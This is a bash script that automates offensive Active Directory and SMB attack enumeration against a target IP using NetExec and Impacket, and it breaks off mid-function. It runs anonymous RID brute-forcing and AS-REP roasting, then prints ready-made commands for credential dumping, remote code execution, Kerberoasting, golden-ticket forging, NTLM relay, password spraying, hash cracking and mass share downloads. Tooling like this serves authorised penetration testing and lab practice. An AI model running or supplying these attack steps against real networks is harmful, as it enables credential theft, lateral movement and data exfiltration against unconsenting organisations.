#!/bin/bash

# Default values
IP=""
user=""
pass=""
domain=""
hash=""
os_type="windows"  # Default to Windows

# Function to display help
usage() {
    echo "Usage: $0 -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH] [-o OS]"
    echo "  -i  Target IP address (required)"
    echo "  -u  Username"
    echo "  -p  Password"
    echo "  -d  Domain"
    echo "  -H  NTLM Hash"
    echo "  -o  Target OS type: 'w' or 'windows' (default), 'l' or 'linux'"
    echo "  -h  Show this help message"
    exit 1
}

# Parse arguments
while getopts "i:u:p:d:H:o:h" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        u) user="$OPTARG" ;;
        p) pass="$OPTARG" ;;
        d) domain="$OPTARG" ;;
        H) hash="$OPTARG" ;;
        o) 
            case "${OPTARG,,}" in  # Convert to lowercase
                w|windows) os_type="windows" ;;
                l|linux) os_type="linux" ;;
                *) echo "Error: Invalid OS type. Use 'w/windows' or 'l/linux'"; usage ;;
            esac
            ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Check if IP is set
if [ -z "$IP" ]; then
    echo "Error: IP address is required."
    usage
fi

# Build optional flags
if [ -n "$domain" ]; then
    DOMAIN_FLAG="-d $domain"
else
    DOMAIN_FLAG=""
fi

if [ -n "$user" ]; then
    if [ -n "$hash" ]; then
        USER_FLAG="-u $user -H $hash"
        RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
        SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
        RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
    elif [ -n "$pass" ]; then
        USER_FLAG="-u $user -p $pass"
        RPC_ARG="-U $domain\\\\$user%$pass"
        SECRETS_ARG="$domain/$user:$pass@$IP"
        RPCDUMP_ARG="-u $user -p $pass -d $domain"
    else
        # Username only, no password - use -N for null session
        USER_FLAG="-u $user"
        RPC_ARG="-U $domain\\\\\\\\$user -N"
        SECRETS_ARG="$domain/$user@$IP"
        RPCDUMP_ARG="-u $user -d $domain"
    fi
else
    USER_FLAG=""
    RPC_ARG="-U '' -N"
fi

HEADER='\033[95m'
OKBLUE='\033[94m'
OKCYAN='\033[96m'
OKGREEN='\033[92m'
WARNING='\033[93m'
FAIL='\033[91m'
ENDC='\033[0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'

echo -e "\n\033[96m[+] Target OS Type:\033[0m $os_type"
echo -e "\n\033[96m[+] Logging Enabled:\033[0m `pwd`/nxc-enum\n"
mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap

# Show Impacket tools suggestions if credentials provided
if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
    echo -e "\n\033[96m[+] Impacket Tools - Quick Reference:\033[0m"
    echo ""
    
    # Build credential string
    if [ -n "$hash" ]; then
        cred_string="$user -hashes :$hash"
    else
        cred_string="$user:$pass"
    fi
    
    if [ -n "$domain" ]; then
        target="$domain/$cred_string@$IP"
        target_simple="$domain/$user@$IP"
    else
        target="$cred_string@$IP"
        target_simple="$user@$IP"
    fi
    
    echo "# 1. Credential Dumping:"
    echo "impacket-secretsdump $target                    # Dump SAM/LSA/NTDS"
    echo "impacket-secretsdump -just-dc $target           # Only NTDS (faster)"
    echo "impacket-secretsdump -just-dc-ntlm $target      # Only NTLM hashes"
    echo ""
    
    echo "# 2. Remote Command Execution:"
    echo "impacket-psexec $target                         # Execute via Service Manager"
    echo "impacket-wmiexec $target                        # Execute via WMI"
    echo "impacket-smbexec $target                        # Execute via SMB"
    echo "impacket-dcomexec $target                       # Execute via DCOM"
    echo "impacket-atexec $target 'whoami'                # Execute via Task Scheduler"
    echo ""
    
    echo "# 3. Kerberos Attacks:"
    if [ -n "$domain" ]; then
        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting"
        echo "impacket-GetUserSPNs $target -dc-ip $IP -request                       # Kerberoasting"
        echo "impacket-getTGT $domain/$cred_string -dc-ip $IP                        # Request TGT"
        echo "impacket-getST $domain/$cred_string -spn cifs/$IP -dc-ip $IP           # Request Service Ticket"
    else
        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP"
        echo "impacket-GetUserSPNs DOMAIN/$cred_string@$IP -dc-ip $IP -request"
        echo "impacket-getTGT DOMAIN/$cred_string -dc-ip $IP"
    fi
    echo ""
    
    echo "# 4. SMB/File Operations:"
    echo "impacket-smbclient $target                      # Interactive SMB client"
    echo "impacket-smbserver share \$(pwd) -smb2support    # Start SMB server (for file transfer)"
    echo "impacket-lookupsid $target                      # Enumerate users via SID"
    echo "impacket-reg $target query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion  # Query registry"
    echo ""
    
    echo "# 5. LDAP/AD Enumeration:"
    echo "impacket-GetADUsers $target -all -dc-ip $IP     # Dump all AD users"
    echo "impacket-GetADComputers $target -all -dc-ip $IP # Dump all computers"
    echo "impacket-dacledit $target -action read -principal Administrator -dc-ip $IP  # Read ACLs"
    echo "impacket-findDelegation $target -dc-ip $IP      # Find delegation"
    echo ""
    
    echo "# 6. MSSQL Attacks:"
    echo "impacket-mssqlclient $target                    # Interactive MSSQL client"
    echo "impacket-mssqlclient $target -windows-auth      # Windows authentication"
    echo ""
    
    echo "# 7. Network Attacks:"
    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay"
    echo "impacket-ntlmrelayx -t ldap://$IP --escalate-user $user             # LDAP relay + escalation"
    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
    echo "impacket-samrdump $target                                           # Dump SAM via RPC"
    echo ""
    
    echo "# 8. Ticket Manipulation (if you have tickets):"
    echo "impacket-ticketConverter ticket.kirbi ticket.ccache                 # Convert ticket format"
    echo "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain $domain Administrator  # Golden ticket"
    echo ""
    
    echo "# 9. Other Useful Tools:"
    echo "impacket-addcomputer $target -computer-name 'EVILPC$' -computer-pass 'Password123'  # Add computer account"
    echo "impacket-exchanger $target -ah $IP                                  # Exchange exploitation"
    echo "impacket-netview $target                                            # Network enumeration"
    echo "impacket-services $target list                                      # List services"
    echo ""
    
    echo -e "\033[93m[!] Note: Replace DOMAIN with actual domain name if not provided\033[0m"
    echo -e "\033[96m[+] For full list: ls /usr/share/doc/python3-impacket/examples/\033[0m"
    echo ""
else
    # Show anonymous Impacket tools when no credentials
    echo -e "\n\033[96m[+] Impacket Tools - Anonymous Enumeration:\033[0m"
    echo ""
    echo "# 1. User Enumeration (no credentials needed):"
    echo "impacket-lookupsid -no-pass anonymous@$IP                           # Enumerate users via SID"
    echo "impacket-samrdump $IP                                               # Dump SAM via RPC (anonymous)"
    if [ -n "$domain" ]; then
        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting (no creds)"
    else
        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP   # AS-REP roasting (no creds)"
    fi
    echo ""
    echo "# 2. Network Enumeration:"
    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
    echo "impacket-netview $IP                                                # Network enumeration"
    echo ""
    echo "# 3. SMB Enumeration (try anonymous):"
    echo "impacket-smbclient -no-pass anonymous@$IP                           # Try anonymous SMB access"
    echo ""
    echo "# 4. NTLM Relay (capture credentials):"
    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay attack"
    echo "impacket-ntlmrelayx -t ldap://$IP -smb2support                      # Relay to LDAP"
    echo ""
    echo "# 5. Start SMB server (for file exfiltration):"
    echo "impacket-smbserver share \$(pwd) -smb2support                        # Start SMB server"
    echo ""
    echo -e "\033[93m[!] Note: Many tools work better with credentials. Run with -u and -p flags.\033[0m"
    echo -e "\033[96m[+] For full list: ls /usr/share/doc/python3-impacket/examples/\033[0m"
    echo ""
fi

echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
# checks if the SMB service is running; returns OS info, name, domain, SMB versions

# Skip Windows-specific LDAP/AD checks for Linux targets
if [ "$os_type" = "windows" ]; then
    # LDAP domain SID (requires credentials)
    if [ -n "$user" ]; then
        unbuffer nxc ldap $IP $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
    else
        echo -e "\n\033[93m[!] Skipping LDAP domain SID (no credentials supplied)\033[0m"
    fi
else
    echo -e "\n\033[93m[!] Skipping Windows-specific LDAP/AD checks (target OS: Linux)\033[0m"
fi

# Skip Windows-specific anonymous/guest enumeration for Linux
if [ "$os_type" = "windows" ]; then
    # Guest access (domain optional)
    echo -e "\n\033[96m[+] Checking Guest access\033[0m"
    if [ -n "$domain" ]; then
        guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
    else
        guest_output=$(nxc smb $IP -u 'guest' -p '' --shares)
    fi
    echo "$guest_output"
    
    # Check if guest access succeeded and suggest commands
    if echo "$guest_output" | grep -q "\[+\]" && ! echo "$guest_output" | grep -q "Error enumerating shares"; then
        # Check if we actually have accessible shares
        has_shares=false
        echo "$guest_output" | while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                has_shares=true
                break
            fi
        done
        
        if echo "$guest_output" | grep -qE "READ|WRITE"; then
            echo -e "\n\033[92m[+] Guest SMB access successful! Suggested commands:\033[0m"
            echo "rpcclient -U 'guest%' $IP"
            echo ""
            
            # Suggest specific shares if found
            echo "# Connect to shares:"
            echo "$guest_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ]; then
                        echo "smbclient -U 'guest%' //$IP/$share"
                    fi
                fi
            done
            echo ""
            
            # Suggest recursive download commands
            echo "# Download all files recursively:"
            echo "$guest_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ] && [[ "$share" != "IPC$" ]]; then
                        echo "smbclient //$IP/$share -U 'guest%' -c 'prompt OFF;recurse ON;mget *'"
                        echo "# Or with smbget: smbget -R //$IP/$share -U guest%"
                    fi
                fi
            done
            echo ""
        fi
    fi
    
    # Anonymous access (domain optional)
    echo -e "\n\033[96m[+] Checking Anonymous access\033[0m"
    if [ -n "$domain" ]; then
        anon_output=$(nxc smb $IP -d "$domain" -u '' -p '' --shares)
    else
        anon_output=$(nxc smb $IP -u '' -p '' --shares)
    fi
    echo "$anon_output"
    
    # Check if anonymous access succeeded and suggest commands
    if echo "$anon_output" | grep -q "\[+\]" && ! echo "$anon_output" | grep -q "Error enumerating shares"; then
        if echo "$anon_output" | grep -qE "READ|WRITE"; then
            echo -e "\n\033[92m[+] Anonymous SMB access successful! Suggested commands:\033[0m"
            echo "rpcclient -U '' -N $IP"
            echo ""
            
            # Suggest specific shares if found
            echo "# Connect to shares:"
            echo "$anon_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ]; then
                        echo "smbclient -U '' -N //$IP/$share"
                    fi
                fi
            done
            echo ""
            
            # Suggest recursive download commands
            echo "# Download all files recursively:"
            echo "$anon_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ] && [[ "$share" != "IPC$" ]]; then
                        echo "smbclient //$IP/$share -N -c 'prompt OFF;recurse ON;mget *'"
                        echo "# Or with smbget: smbget -R //$IP/$share -U %"
                    fi
                fi
            done
            echo ""
        fi
    fi
else
    echo -e "\n\033[93m[!] Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)\033[0m"
fi

# Skip Windows-specific anonymous RPC/AD enumeration for Linux
if [ "$os_type" = "windows" ]; then
    echo -e "\n\033[96m[+] Anonymous RPC User Enumeration (lookupsid.py)\033[0m"
    echo "# Attempting anonymous SID bruteforce to enumerate users..."
    lookupsid_output=$(timeout 30s lookupsid.py -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
    echo "$lookupsid_output"
    
    # Check if lookupsid found users
    if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
        echo -e "\n\033[92m[+] Successfully enumerated users/groups via anonymous RPC!\033[0m"
        echo "# Results saved to: nxc-enum/smb/lookupsid-anonymous.txt"
        echo ""
        
        # Automatically extract and save usernames
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_${timestamp}.txt"
        grep 'SidTypeUser' nxc-enum/smb/lookupsid-anonymous.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' > "$users_file"
        
        echo -e "\033[92m[+] Extracted usernames saved to: $users_file\033[0m"
        echo "# Found $(wc -l < "$users_file") users (excluding machine accounts)"
        echo ""
        echo "# View users:"
        echo "cat $users_file"
        echo ""
        echo "# Use for password spraying:"
        echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
        echo ""
        
        # Try alternative enumeration tools if lookupsid didn't find users
    else
        echo -e "\n\033[93m[!] lookupsid.py didn't find users, trying alternative tools...\033[0m"
    fi
    
    # Alternative Tool 1: NetExec RID Brute (anonymous)
    echo -e "\n\033[96m[+] Trying NetExec RID Brute (anonymous)\033[0m"
    nxc_rid_output=$(timeout 15s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
    echo "$nxc_rid_output"
    
    # Alternative Tool 2: rpcclient enumdomusers
    echo -e "\n\033[96m[+] Trying rpcclient enumdomusers (anonymous)\033[0m"
    rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
    echo "$rpcclient_output"
    
    # Alternative Tool 3: samrdump.py
    echo -e "\n\033[96m[+] Trying samrdump.py (anonymous)\033[0m"
    samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
    echo "$samrdump_output"
    
    # Alternative Tool 4: enum4linux (if installed)
    if command -v enum4linux &> /dev/null; then
        echo -e "\n\033[96m[+] Trying enum4linux (anonymous)\033[0m"
        timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
    fi
    
    # Check if we got users from any tool and create users file if not already created
    users_file_count=$(ls nxc-enum/smb/users_*.txt 2>/dev/null | wc -l)
    if [ "$users_file_count" -eq 0 ]; then
        # Try to extract from alternative tools
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_${timestamp}.txt"
        
        # Try nxc output
        if echo "$nxc_rid_output" | grep -q "SidTypeUser"; then
            echo "$nxc_rid_output" | grep "SidTypeUser" | awk '{print $NF}' | grep -v '\$$' > "$users_file"
        fi
        
        # Try rpcclient output
        if [ ! -s "$users_file" ] && echo "$rpcclient_output" | grep -q "user:"; then
            echo "$rpcclient_output" | grep "user:" | awk -F'[][]' '{print $2}' > "$users_file"
        fi
        
        # If we got users, show them
        if [ -s "$users_file" ]; then
            echo -e "\n\033[92m[+] Extracted usernames from alternative tools: $users_file\033[0m"
            echo "# Found $(wc -l < "$users_file") users"
        fi
    else
        # Users file already exists from lookupsid
        users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
    fi
    
    # Continue with AS-REP roasting if we have a users file
    if [ -n "$users_file" ] && [ -s "$users_file" ]; then
        
        # AS-REP Roasting with GetNPUsers.py
        echo -e "\n\033[96m[+] Checking for AS-REP Roastable users (GetNPUsers.py)\033[0m"
        
        # Try to get domain name
        if [ -n "$domain" ]; then
            domain_name="$domain"
        else
            # Try to extract from guest output first
            domain_name=$(echo "$guest_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
            
            # If not found, try anonymous output
            if [ -z "$domain_name" ]; then
                domain_name=$(echo "$anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
            fi
            
            # If still not found, try lookupsid output
            if [ -z "$domain_name" ]; then
                domain_name=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
            fi
        fi
        
        if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
            echo "# Using domain: $domain_name"
            getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
            echo "$getnpusers_output"
            
            # Check if any AS-REP roastable users were found
            if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
                # Extract just the hashes to a clean file
                grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
                
                # Extract vulnerable usernames
                vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
                
                echo -e "\n\033[92m[+] AS-REP Roastable users found: $vulnerable_users\033[0m"
                echo "# Full output: nxc-enum/smb/asrep-getnpusers.txt"
                echo "# Clean hashes: nxc-enum/smb/asrep-hashes.txt"
                echo ""
                echo "# Crack with John the Ripper:"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
                echo ""
                echo "# Or with Hashcat:"
                echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
                echo ""
                echo "# Show cracked passwords:"
                echo "john --show nxc-enum/smb/asrep-hashes.txt"
            fi
        else
            echo "# Could not auto-detect domain name"
            echo "# Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
            echo "# Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
        fi
        echo ""
    fi
else
    echo -e "\n\033[93m[!] Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)\033[0m"
fi




# FTP and LDAP anonymous checks (Windows-specific)
if [ "$os_type" = "windows" ]; then
    echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
    ftp_output=$(timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2)
    echo "$ftp_output"
    
    # Check if anonymous FTP access succeeded and suggest commands
    if echo "$ftp_output" | grep -q "\[+\]"; then
        echo -e "\n\033[92m[+] Anonymous FTP access successful! Suggested commands:\033[0m"
        echo "ftp $IP"
        echo "# Username: anonymous"
        echo "# Password: anonymous"
        echo ""
        echo "# Or use lftp for better features:"
        echo "lftp -u anonymous,anonymous $IP"
        echo ""
        echo "# Download all files recursively:"
        echo "wget -r ftp://anonymous:anonymous@$IP/"
        echo ""
    fi
    
    echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
    ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
    echo "$ldap_output"
    
    # Check if anonymous LDAP access succeeded and suggest commands
    if echo "$ldap_output" | grep -q "\[+\]"; then
        echo -e "\n\033[92m[+] Anonymous LDAP access successful! Suggested commands:\033[0m"
        
        # Extract domain from output for base DN
        if [ -n "$domain" ]; then
            base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\" | tee ldap-dump.txt"
            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=user)\" | tee ldap-users.txt"
            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=group)\" | tee ldap-groups.txt"
        else
            echo "# Get base DN (usually works anonymously):"
            echo "ldapsearch -x -H ldap://$IP -b \"\" -s base namingContexts"
            echo ""
            echo "# Note: Object enumeration often requires credentials. Try with valid creds:"
            echo "# ldapsearch -x -H ldap://$IP -D \"CN=user,DC=domain,DC=local\" -w 'password' -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\""
        fi
        echo ""
    fi
fi

echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
nfs_output=$(unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt)
echo "$nfs_output"

# Check for NFS shares and suggest mount commands
if echo "$nfs_output" | grep -qE "r--|rw-|rwx"; then
    echo -e "\n\033[92m[+] NFS shares found! Suggested mount commands:\033[0m"
    echo "$nfs_output" | grep -E "r--|rw-|rwx" | while read -r line; do
        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
        # Extract the share path (starts with /)
        nfs_share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^\//) {print $i; exit}}'| head -n1)
        if [ ! -z "$nfs_share" ]; then
            echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
            echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
        fi
    done
    echo ""
fi



# Helper function to run nxc and suggest login command if successful
# Helper function to run nxc and suggest login command if successful
check_and_suggest() {
    service=$1
    shift
    echo "Checking $service..."
    # Run the command and capture output
    output=$("$@")
    echo "$output"
    
    # Check for success indicator "[+]"
    if echo "$output" | grep -q "+"; then
        echo -e "\033[92m[+] Valid credentials for $service! Suggested command:\033[0m"
        
        # Prepare credential strings
        if [ -n "$hash" ]; then
            IMPACKET_CREDS="$domain/$user@$IP -hashes :$hash"
            WINRM_CREDS="-i $IP -u '$user' -H '$hash'"
            if [ -n "$domain" ]; then
                SMBCLIENT_AUTH="-U '$domain\\$user' --pw-nt-hash $hash"
                SMBGET_USER="$domain/$user%$hash"
            else
                SMBCLIENT_AUTH="-U '$user' --pw-nt-hash $hash"
                SMBGET_USER="$user%$hash"
            fi
            XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
        else
            IMPACKET_CREDS="$domain/$user:$pass@$IP"
            WINRM_CREDS="-i $IP -u '$user' -p '$pass'"
            if [ -n "$domain" ]; then
                SMBCLIENT_AUTH="-U '$domain\\$user%$pass'"
                SMBGET_USER="$domain/$user%$pass"
            else
                SMBCLIENT_AUTH="-U '$user%$pass'"
                SMBGET_USER="$user%$pass"
            fi
            XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
        fi

        case $service in
            "smb")
                # Suggest Impacket tools for SMB
                echo -e "\033[93m[!] Impacket tools for SMB:\033[0m"
                echo "impacket-psexec $IMPACKET_CREDS"
                echo "impacket-smbexec $IMPACKET_CREDS"
                
                # Check for Admin access (Pwn3d!)
                if echo "$output" | grep -q "Pwn3d!"; then
                     echo -e "\033[92m[+] Admin access (Pwn3d!) detected - tools above will work!\033[0m"
                else
                     echo -e "\033[91m[!] Note: Admin tools above require elevated privileges\033[0m"
                fi
                echo ""

                # Enumerate shares to see which ones are accessible
                echo "Enumerating shares for suggestions..."
                # Use the already captured output if it contains shares, or run it if needed.
                # Since we are optimizing to run --shares in the main call, we use $output.
                shares_output="$output"
                
                # Check for writable shares and display prominent notice
                writable_shares=$(echo "$shares_output" | sed 's/\x1b\[[0-9;]*m//g' | grep "WRITE" | awk '{for(i=1;i<=NF;i++) if($i=="WRITE") print $(i-1)}' | sed 's/^\\\//')
                if [ -n "$writable_shares" ]; then
                    echo -e "\n\033[91m[!!!] WRITABLE SHARES FOUND - Potential for privilege escalation!\033[0m"
                    echo -e "\033[93m[+] Writable shares:\033[0m"
                    echo "$writable_shares" | while read -r share; do
                        if [ ! -z "$share" ]; then
                            echo "  - $share"
                        fi
                    done
                    echo -e "\n\033[92m[+] Exploitation suggestions:\033[0m"
                    echo "# Upload malicious files, DLL hijacking, or SCF/LNK attacks"
                    echo "# Check for startup folders, scripts, or scheduled tasks"
                    echo ""
                fi
                
                echo -e "\n\033[92m[+] Suggested connections:\033[0m"
                echo "$shares_output" | while read -r line; do
                    # Clean color codes for parsing
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    
                    # Check for accessible shares (READ or WRITE)
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        # Extract share name (it is the field before READ or WRITE)
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                        
                        # Remove leading backslash if present
                        share=${share#\\}
                        
                        if [ ! -z "$share" ]; then
                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
                        fi
                    fi
                done
                
                # Add recursive download suggestions
                echo -e "\n\033[92m[+] Download all files from shares:\033[0m"
                echo "$shares_output" | while read -r line; do
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                        share=${share#\\}
                        if [ ! -z "$share" ]; then
                            echo "# Download $share recursively:"
                            if [ -n "$hash" ]; then
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
                                echo "# Note: smbget doesn't support --pw-nt-hash, use smbclient above"
                            else
                                echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
                                echo "# Or with smbclient (interactive):"
                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
                            fi
                            echo ""
                        fi
                    fi
                done
                
                # Add remote execution tool suggestions
                echo -e "\n\033[92m[+] Remote execution tools:\033[0m"
                if echo "$output" | grep -q "Pwn3d!"; then
                    echo "# Admin access detected - these tools should work:"
                    echo "wmiexec.py $IMPACKET_CREDS"
                    echo "psexec.py $IMPACKET_CREDS"
                    echo "smbexec.py $IMPACKET_CREDS"
                    echo "atexec.py $IMPACKET_CREDS"
                else
                    echo "# No admin access - these tools may fail:"
                    echo "wmiexec.py $IMPACKET_CREDS  # Requires admin"
                    echo "psexec.py $IMPACKET_CREDS   # Requires admin"
                fi
                ;;
            "wmi")
                if echo "$output" | grep -q "Pwn3d!"; then
                     echo -e "\033[92m[+] Admin access (Pwn3d!) detected - impacket-wmiexec should work!\033[0m"
                else
                     echo -e "\033[93m[!] Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied).\033[0m"
                fi
                echo "impacket-wmiexec $IMPACKET_CREDS"
                ;;
            "winrm")
                echo "evil-winrm $WINRM_CREDS"
                ;;
            "mssql")
                echo "impacket-mssqlclient $IMPACKET_CREDS"
                ;;
            "ssh")
                echo "ssh '$user@$IP'"
                ;;
            "ftp")
                echo "ftp ftp://$user:$pass@$IP"
                ;;
            "vnc")
                echo "vncviewer $IP"
                ;;
            "ldap")
                # LDAP enumeration tools
                echo -e "\n\033[96m[+] LDAP Enumeration Tools:\033[0m"
                if [ -n "$domain" ]; then
                    base_dn="DC=${domain//./,DC=}"
                    if [ -n "$hash" ]; then
                        echo "# 1. NetExec LDAP enumeration:"
                        echo "nxc ldap $IP -d '$domain' -u '$user' -H '$hash' --users"
                        echo "nxc ldap $IP -d '$domain' -u '$user' -H '$hash' --bloodhound -c All"
                        echo ""
                        echo "# 2. ldapdomaindump (requires password, not hash):"
                        echo "# ldapdomaindump -u '$domain\\$user' -p 'PASSWORD' ldap://$IP"
                    else
                        echo "# 1. ldapsearch:"
                        echo "ldapsearch -x -H ldap://$IP -D \"$user@$domain\" -w '$pass' -b \"$base_dn\" \"(objectClass=*)\""
                        echo ""
                        echo "# 2. ldapdomaindump:"
                        echo "ldapdomaindump -u '$domain\\$user' -p '$pass' ldap://$IP"
                        echo ""
                        echo "# 3. BloodHound data collection:"
                        echo "bloodhound-python -u '$user' -p '$pass' -d $domain -ns $IP -c All"
                        echo ""
                        echo "# 4. NetExec LDAP enumeration:"
                        echo "nxc ldap $IP -d '$domain' -u '$user' -p '$pass' --users --bloodhound -c All"
                    fi
                else
                    echo "# Note: Domain name required for LDAP tools. Specify with -d flag"
                fi
                ;;
        esac
        echo ""
    fi
}


# Credential validation (Windows-specific)
if [ "$os_type" = "windows" ]; then
    echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
    # Build optional flags
    # Flags already built at the top
    
    # SMB (anonymous allowed, domain optional)
    # Added --shares to check shares in one go
    smb_output=$(check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --timeout 2)
    echo "$smb_output"
    
    # Check for SMB signing status
    if echo "$smb_output" | grep -q "signing:True"; then
        echo -e "\n\033[93m[!] SMB Signing is ENABLED\033[0m"
        echo -e "\033[96m[+] Impact:\033[0m"
        echo "  - NTLM relay attacks are NOT possible"
        echo "  - Man-in-the-middle attacks are prevented"
        echo "  - SMB traffic is cryptographically signed"
        echo ""
